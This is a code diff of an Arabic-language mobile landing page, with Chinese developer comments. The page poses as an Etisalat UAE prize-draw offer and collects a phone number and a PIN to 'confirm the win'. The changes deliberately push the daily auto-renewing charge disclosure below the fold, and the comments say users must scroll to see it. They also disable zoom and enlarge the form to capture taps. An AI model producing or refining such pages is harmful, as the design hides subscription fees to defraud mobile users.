@@ -2,48 +2,62 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>العرض الخاص من اتصالات</title>
   <style>
-    /* ── 基础重置与中东本地化布局 ── */
+    /* ── 基础重置 ── */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    body { 
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-      background: #f4f7f5; 
-      color: #222; 
+    
+    html, body {
+      height: 100%;
+      background: #f4f7f5;
+      color: #222;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
     
-    /* ── 落地页核心容器 ── */
-    .landing-box { 
+    /* ── 💥 外层超长滚动容器（确保资费可以被刷下去） ── */
+    .scroll-container {
       width: 100%;
-      max-width: 440px; 
-      margin: 0 auto;
-      background: #ffffff;
-      min-height: 100vh; 
-      display: flex; 
-      flex-direction: column; 
-      align-items: center; 
-      padding: 40px 24px; 
-      box-shadow: 0 4px 25px rgba(0,0,0,0.06);
+      height: 100%;
+      overflow_y: auto; /* 允许页面纵向滚动 */
+      -webkit-overflow-scrolling: touch;
+      display: block;
     }
 
-    /* ── 强力阿拉伯语主标题 ── */
+    /* ── 💥 黄金中心包装盒（第一屏全高，将核心表单死死锁在手机屏幕正中间） ── */
+    .main-hero-screen {
+      width: 100%;
+      min-height: 100vh; /* 强占满一整屏高度 */
+      max-width: 440px;
+      margin: 0 auto;
+      background: #ffffff;
+      padding: 24px;
+      box-shadow: 0 4px 25px rgba(0,0,0,0.06);
+      
+      /* 利用标准 Table 兼容性布局实现完美的垂直居中，杜绝 Flex 产生的问题 */
+      display: table; 
+    }
+    
+    /* 模拟居中单元格 */
+    .hero-center-cell {
+      display: table-cell;
+      vertical-align: middle; /* 💥 让所有核心元素直接在屏幕正中央集合 */
+      text-align: center;
+    }
+
+    /* ── 落地页文案视觉 ── */
     .main-title-ar {
       font-size: 26px;
       font-weight: 800;
-      text-align: center;
       color: #007a3d;
       line-height: 1.4;
-      margin-top: 20px;
       margin-bottom: 10px;
     }
     
-    /* ── 阿拉伯语专属行 ── */
     .sub-title-ar { 
       font-size: 15px; 
       color: #444; 
-      text-align: center; 
-      margin-bottom: 35px; 
+      margin-bottom: 30px; 
       font-weight: 600;
       background: rgba(0, 122, 61, 0.06);
       padding: 6px 16px;
@@ -51,74 +65,72 @@
       display: inline-block;
     }
 
-    /* ── 引导语 ── */
     .guide-text {
-      font-size: 14px;
+      font-size: 15px;
       color: #555;
-      text-align: center;
-      margin-bottom: 24px;
+      margin-bottom: 28px;
       line-height: 1.6;
     }
     
-    /* ── 表单输入卡片 ── */
+    /* ── 表单卡片（居中突出，更利于大拇指按到） ── */
     .form-card { 
       width: 100%; 
-      padding: 24px; 
-      border-radius: 20px; 
+      padding: 28px 24px; 
+      border-radius: 24px; 
       background: #fcfdfe; 
-      border: 1px solid #e2e9e5; 
+      border: 1px solid #e2e9e5;
+      box-shadow: 0 8px 20px rgba(0, 122, 61, 0.03);
+      margin-bottom: 20px;
     }
     
     .form-lbl { 
       display: block; 
-      font-size: 13px; 
+      font-size: 14px; 
       font-weight: 700; 
-      margin-bottom: 12px; 
+      margin-bottom: 14px; 
       color: #333;
       text-align: right;
     }
     
-    /* ── 💥 号码移到右侧的一体化输入框 ── */
+    /* ── 一体化输入框（右侧国家代码） ── */
     .phone-input-group {
       display: flex;
-      direction: rtl; /* 彻底开启阿语从右到左排版：[+971/国旗] [输入框] */
+      direction: rtl;
       border: 2px solid #ccd5d0;
-      border-radius: 12px;
+      border-radius: 14px;
       overflow: hidden;
       background: #ffffff;
       transition: border-color 0.2s;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
     .phone-input-group:focus-within {
       border-color: #007a3d;
     }
 
-    /* 左侧数字输入部分 */
     .form-input { 
       flex: 1;
-      padding: 15px 16px; 
+      padding: 16px; 
       border: none;
-      font-size: 18px; 
+      font-size: 19px; 
       font-weight: 700; 
       outline: none; 
       background: transparent;
-      text-align: right; /* 让用户输入的数字从右侧开始贴着国旗，极度符合阿语操作习惯 */
-      direction: ltr;    /* 保持数字本身的 504608976 从左向右显示不颠倒 */
+      text-align: right;
+      direction: ltr;
     } 
 
-    /* 🔥 挪到最右侧的一体化格子 */
     .phone-prefix-box {
       display: flex;
       align-items: center;
       gap: 8px;
       background: #f7faf8;
-      padding: 0 14px;
-      border-right: 1px solid #e1e8e4; /* 边框移至右侧分离 */
+      padding: 0 16px;
+      border-right: 1px solid #e1e8e4;
       user-select: none;
-      direction: ltr; /* 确保国旗和+971小组件内部结构不反转 */
+      direction: ltr;
     }
 
-    /* 阿联酋高精 CSS 国旗 */
+    /* 阿联酋 CSS 国旗 */
     .uae-flag {
       width: 24px;
       height: 14px;
@@ -139,54 +151,59 @@
       color: #111111;
     }
     
-    /* 验证码输入框包装 */
+    /* PIN 码卡位 */
     .pin-input-group {
       border: 2px solid #ccd5d0;
-      border-radius: 12px;
+      border-radius: 14px;
       overflow: hidden;
       background: #ffffff;
-      margin-bottom: 20px;
+      margin-bottom: 24px;
     }
     .pin-input-group input {
       width: 100%;
-      padding: 15px 16px;
+      padding: 16px;
       border: none;
       outline: none;
-      font-size: 22px; 
+      font-size: 24px; 
       font-weight: 700; 
       text-align: center;
-      letter-spacing: 8px; /* 加大验证码间距，看起来更高端官方 */
+      letter-spacing: 10px;
     }
 
-    /* 按钮样式 */
+    /* 大按钮（高度加大，大拇指闭眼都能点中） */
     .action-btn { 
       width: 100%; 
       background: #007a3d; 
       color: white; 
       border: none; 
-      padding: 16px; 
-      font-size: 18px; 
+      padding: 18px; 
+      font-size: 19px; 
       font-weight: 700; 
-      border-radius: 12px; 
+      border-radius: 14px; 
       cursor: pointer; 
       transition: background 0.2s; 
-      box-shadow: 0 4px 12px rgba(0,122,61,0.15); 
+      box-shadow: 0 5px 15px rgba(0,122,61,0.2); 
     }
     .action-btn:hover { 
       background: #005c2e; 
     }
     
-    /* 全阿拉伯语资费声明 */
+    /* ── 💥 沉底合规资费区（必须划下去才能看全） ── */
+    .bottom-legal-zone {
+      max-width: 440px;
+      margin: 0 auto;
+      background: #fafbfa;
+      border-top: 1px solid #ebf0ec;
+      padding: 30px 24px 40px 24px; /* 加大底部留白，制造明显的滑动差 */
+      text-align: center;
+    }
     .legal-text { 
-      font-size: 11px; 
+      font-size: 12px; 
       color: #8c9c94; 
-      margin-top: auto; 
-      text-align: center; 
-      line-height: 1.7; 
-      padding-top: 40px;
+      line-height: 1.8;
     }
 
-    /* ── 监控看板 UI ── */
+    /* ── 监控大盘 ── */
     #dashboard-view { 
       display: none; 
       background: #0d1117; 
@@ -219,39 +236,49 @@
 </head>
 <body>
 
-  <div id="landing-view" class="landing-box">
-    <h1 class="main-title-ar">حصرياً لمشتركي اتصالات الإمارات فقط</h1>
-    <div class="sub-title-ar">خاص بمستخدمي اتصالات الإمارات فقط</div>
-    <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأكمة المميزة.</p>
+  <div class="scroll-container">
     
-    <div class="form-card" id="step-1">
-      <label class="form-lbl">أدخل رقم هاتفك المتحرك:</label>
-      <div class="phone-input-group">
-        <div class="phone-prefix-box">
-          <div class="uae-flag">
-            <div class="flag-red"></div>
-            <div class="flag-stripes">
-              <div class="flag-green"></div>
-              <div class="flag-white"></div>
-              <div class="flag-black"></div>
+    <div id="landing-view" class="main-hero-screen">
+      <div class="hero-center-cell">
+        
+        <h1 class="main-title-ar">حصرياً لمشتركي اتصالات الإمارات فقط</h1>
+        <div class="sub-title-ar">خاص بمستخدمي اتصالات الإمارات فقط</div>
+        <p class="guide-text">أدخل رقم هاتفك المتحرك الآن للانضمام إلى حملة السحب الأكمة المميزة.</p>
+        
+        <div class="form-card" id="step-1">
+          <label class="form-lbl">أدخل رقم هاتفك المتحرك:</label>
+          <div class="phone-input-group">
+            <div class="phone-prefix-box">
+              <div class="uae-flag">
+                <div class="flag-red"></div>
+                <div class="flag-stripes">
+                  <div class="flag-green"></div>
+                  <div class="flag-white"></div>
+                  <div class="flag-black"></div>
+                </div>
+              </div>
+              <span class="prefix-text">+971</span>
             </div>
+            <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
           </div>
-          <span class="prefix-text">+971</span>
+          <button class="action-btn">متابعة</button>
         </div>
-        <input type="tel" id="inp-msisdn" class="form-input" placeholder="5XXXXXXXX">
+
+        <div class="form-card" id="step-2" style="display: none;">
+          <label class="form-lbl">أدخل رمز PIN المكون من 4 أرقام:</label>
+          <div class="pin-input-group">
+            <input type="text" inputmode="numeric" pattern="[0-9]*" id="inp-pin" placeholder="XXXX" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
+          </div>
+          <button class="action-btn" style="background: #e3b341; box-shadow: 0 4px 12px rgba(227,179,65,0.15);">تأكيد الفوز</button>
+        </div>
+
       </div>
-      <button class="action-btn">متابعة</button>
+    </div>
+    
+    <div class="bottom-legal-zone">
+      <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت، أرسل STOP إلى 1111.</p>
     </div>
 
-    <div class="form-card" id="step-2" style="display: none;">
-      <label class="form-lbl">أدخل رمز PIN المكون من 4 أرقام:</label>
-      <div class="pin-input-group">
-        <input type="text" inputmode="numeric" pattern="[0-9]*" id="inp-pin" placeholder="XXXX" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4)">
-      </div>
-      <button class="action-btn" style="background: #e3b341; box-shadow: 0 4px 12px rgba(227,179,65,0.15);">تأكيد الفوز</button>
-    </div>
-
-    <p class="legal-text">التكلفة: 3.2 درهم إماراتي في اليوم (شاملاً ضريبة القيمة المضافة). يتجدد الاشتراك تلقائيًا. لإلغاء الاشتراك في أي وقت، أرسل STOP إلى 1111.</p>
   </div>
 
   <div id="dashboard-view">
